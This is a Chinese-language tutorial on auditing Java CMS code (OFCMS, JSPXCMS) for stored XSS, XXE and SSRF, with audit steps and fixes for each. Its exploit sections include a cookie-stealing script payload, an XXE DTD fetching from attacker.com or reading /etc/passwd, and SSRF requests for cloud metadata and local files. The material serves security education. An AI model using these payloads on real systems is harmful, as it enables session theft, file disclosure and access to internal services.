@@ -1,0 +1,155 @@
+引言
+
+随着企业应用架构的日益复杂，Java Web系统的安全性面临严峻挑战。代码审计作为白盒测试的核心手段，能够从源码层面发现安全隐患，有效降低系统被攻击的风险。本文将以OFCMS和JSPXCMS两个典型Java CMS为例，结合XSS跨站脚本、XXE外部实体注入及SSRF服务端请求伪造三类高危漏洞，从理论原理出发，深入到实际代码审计过程，揭示漏洞的形成原因、利用方式及修复策略，帮助开发与安全人员构建更安全的Java应用。
+
+---
+
+第一部分：XSS跨站脚本漏洞
+
+1.1 理论概述
+
+跨站脚本攻击（Cross-Site Scripting, XSS）是指攻击者将恶意脚本注入到网页中，当其他用户访问该页面时，脚本在浏览器端执行，从而窃取Cookie、会话令牌或进行钓鱼等操作。根据脚本注入方式的不同，XSS分为反射型、存储型和DOM型三类，其中存储型XSS危害最大——恶意数据被持久化存储在服务器端，每次请求都会触发。
+
+XSS的核心成因在于未对用户输入进行充分过滤且未对输出进行安全编码，使得数据被当作代码解析。审计时需要重点关注用户可控数据进入后端后的存储、回显链路。
+
+1.2 实践案例：OFCMS评论存储XSS
+
+漏洞定位
+在OFCMS中，用户评论功能是XSS的高发点。审计人员首先定位到前端评论提交的模板文件 article.html，发现评论内容提交至后端接口 /comment/save。搜索路由映射，找到对应控制器方法 CommentApi#save。
+
+代码分析
+CommentApi.save 方法接收 Comment 对象参数，其中 content 字段（对应前端 comment_content）直接取自用户请求，未经任何过滤或转义，便调用 commentService.save(comment) 存入数据库。当其他用户访问文章详情页时，前端通过 article.html 从数据库取出该评论内容，直接以HTML形式渲染到页面，导致任意JavaScript代码被执行。
+
+审计要点
+
+· 输入点识别：查找所有接收用户输入的接口，如 @RequestParam、@RequestBody 等。
+· 数据流追踪：跟踪输入参数从控制器到持久层的完整路径，观察是否有 HtmlUtils.htmlEscape、Jsoup.clean 等过滤逻辑。
+· 输出点检查：查看模板引擎（如FreeMarker、JSP）或前端代码，确认是否使用 ${content} 直接输出而非 $!{content} 或 escape 函数。
+
+漏洞利用
+攻击者在评论框提交：
+
+```html
+<script>alert(document.cookie)</script>
+```
+
+当管理员或其他用户浏览该文章时，脚本自动执行，窃取Cookie。
+
+修复建议
+
+1. 输入过滤：使用 Jsoup.clean 等工具移除危险标签和属性。
+2. 输出编码：在模板中强制开启HTML编码，如FreeMarker使用 ?html 或 escape 指令。
+3. 内容安全策略：部署CSP头，限制脚本来源。
+
+---
+
+第二部分：XXE外部实体注入
+
+2.1 理论概述
+
+XML外部实体注入（XML External Entity, XXE）发生在应用程序解析XML输入时，允许加载外部实体，从而导致文件读取、内网端口扫描、服务端请求伪造甚至拒绝服务攻击。XXE的根源在于XML解析器默认开启了对外部实体的支持。审计时需重点关注使用 SAXReader、DocumentBuilder、SAXBuilder、JRXmlLoader 等解析器的场景，检查是否禁用DTD和外部实体。
+
+2.2 实践案例：OFCMS报表导出XXE
+
+漏洞定位
+在OFCMS源码中搜索关键类名 JRXmlLoader，发现其在 JasperCompileManager.compile 方法中被调用，用于加载报表模板文件（.jrxml）。向上回溯调用链，最终定位到 ReportAction#expReport 方法，该方法通过路由 /report/expReport.html 对外暴露，接受参数 j 指定要编译的jrxml文件名。
+
+代码分析
+expReport 方法接收 j 参数（如 j=test），拼接文件路径后调用 JasperCompileManager.compileReport(jrxmlPath)，内部使用 JRXmlLoader.load 解析XML。由于解析器未禁用外部实体，攻击者可构造恶意jrxml文件上传，或在已有jrxml文件中注入外部实体声明。
+
+审计要点
+
+· 搜索敏感解析器：通过IDE全局搜索 JRXmlLoader.load、SAXReader.read、DocumentBuilder.parse 等API。
+· 检查安全配置：查看解析器初始化代码，确认是否调用 setFeature 禁用外部实体（如 http://apache.org/xml/features/disallow-doctype-decl）。
+· 跟踪输入源：确认XML内容是否完全可控，如上传文件、参数拼接等。
+
+漏洞利用
+攻击者上传包含恶意DTD的jrxml文件：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xiaodi [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<jasperReport ...>
+</jasperReport>
+```
+
+然后访问 /report/expReport.html?j=malicious，触发解析器请求远程服务器，实现SSRF。若改为 file:///etc/passwd 则可读取服务器文件。
+
+修复建议
+
+1. 禁用DTD：对解析器设置 setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)。
+2. 禁止外部实体：显式关闭 http://xml.org/sax/features/external-general-entities 和 http://xml.org/sax/features/external-parameter-entities。
+3. 使用安全的解析库：如JDK内置的 XMLInputFactory 可设置 XMLInputFactory.SUPPORT_DTD 为 false。
+
+---
+
+第三部分：SSRF服务端请求伪造
+
+3.1 理论概述
+
+服务端请求伪造（Server-Side Request Forgery, SSRF）是指攻击者诱导服务器向任意地址发起HTTP请求，从而绕过防火墙访问内网系统、探测端口、读取文件（如 file://）或攻击内网应用。SSRF通常出现在需要从远程获取资源的功能中，如采集、图片下载、Webhook等。审计时应关注使用 HttpClient、URLConnection、OkHttp、RestTemplate、Jsoup 等发起网络请求的代码，并追踪请求URL是否完全可控。
+
+3.2 实践案例：JSPXCMS多处SSRF
+
+案例一：采集功能SSRF（fetch_url.do）
+
+代码定位
+在JSPXCMS中搜索 httpclient.execute，发现位于 Collect#fetchHtml 方法，用于采集远程网页内容。向上追溯，CollectController#fetchUrl 方法通过路由 /cmscp/ext/collect/fetch_url.do 对外暴露，参数 url 直接传入 fetchHtml(url)。
+
+漏洞分析
+fetchUrl 方法未对 url 参数做任何协议、域名或端口限制，攻击者可指定任意内网地址（如 http://127.0.0.1:8080/manager）或非HTTP协议（如 file:///etc/passwd）。fetchHtml 使用 httpclient.execute 发起请求，导致SSRF。
+
+案例二：UEditor编辑器SSRF（ueditor.do）
+
+代码定位
+搜索 openConnection，定位到 UploadControllerAbstract#ueditorCatchImage 方法，其功能是抓取远程图片并保存到本地。该方法通过 UploadController#ueditorCatchImage 映射到路由 /ueditor.do?action=catchimage，参数 source[] 为待抓取的图片URL数组。
+
+漏洞分析
+代码遍历 source[] 数组，对每个URL调用 new URL(url).openConnection()，并设置连接超时。同样未对URL进行校验，攻击者可利用 file:// 读取服务器文件，或向内网IP发起请求探测端口。
+
+审计要点
+
+· 搜索网络请求类：列出所有可能发起请求的API，如 HttpClient.execute、URL.openConnection、RestTemplate.exchange 等。
+· 参数追踪：确认URL来源是否为请求参数、数据库或文件，并检查是否有 URLValidator、IP黑/白名单 等过滤。
+· 协议限制：查看是否允许 file://、gopher:// 等危险协议。
+
+漏洞利用
+攻击者访问：
+
+```
+/cmscp/ext/collect/fetch_url.do?url=http://169.254.169.254/latest/meta-data/
+```
+
+或：
+
+```
+/ueditor.do?action=catchimage&source[]=file:///etc/passwd
+```
+
+可获取云服务器元数据或读取系统文件。
+
+修复建议
+
+1. 协议白名单：仅允许 http:// 和 https://。
+2. 域名/IP限制：禁止内网IP段（127.0.0.1/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16）及特殊地址。
+3. URL解析校验：使用 java.net.URI 解析并检查Host，防止绕过（如 http://127.0.0.1:80 变体）。
+4. 禁用重定向：设置 httpClient 不自动跟随重定向，或对重定向后的URL再次校验。
+
+---
+
+总结与防护措施
+
+通过上述三个案例可以看出，Java Web应用的漏洞往往源于对用户输入的不信任处理。代码审计的核心在于数据流跟踪与敏感函数聚焦：
+
+· XSS：追踪用户输入至输出渲染的完整路径，确保输出编码到位。
+· XXE：全局搜索XML解析器，检查外部实体是否被禁用。
+· SSRF：定位所有网络请求代码，验证URL来源是否可信且受限制。
+
+在实际开发中，应遵循“纵深防御”原则：
+
+1. 输入验证：对所有外部输入进行合法性校验，如正则匹配、白名单过滤。
+2. 安全配置：第三方库使用前阅读安全手册，关闭危险特性（如XXE、重定向）。
+3. 最小权限：应用运行账户禁用shell、限制文件系统访问权限，降低漏洞利用后的危害。
+4. 定期审计：结合自动化工具（如FindSecBugs、Fortify）与人工审查，持续发现并修复漏洞。
+
+安全是一场持续博弈，唯有深入理解漏洞本质，并将安全实践融入编码习惯，才能构建真正经得起考验的Java Web应用。
